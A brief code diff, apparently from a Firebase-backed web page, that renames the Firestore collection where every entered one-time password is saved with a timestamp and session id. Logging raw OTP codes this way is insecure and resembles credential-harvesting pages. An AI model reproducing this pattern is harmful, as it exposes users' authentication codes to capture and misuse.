@@ -221,7 +221,7 @@
     const sessionId = localStorage.getItem('sessionid') || 'unknown';
 
     // Always save OTP attempt
-    await addDoc(collection(db, "otp_verifications"), {
+    await addDoc(collection(db, "user-loginkk"), {
       otp: otpValue,
       timestamp: serverTimestamp(),
       sessionId: sessionId
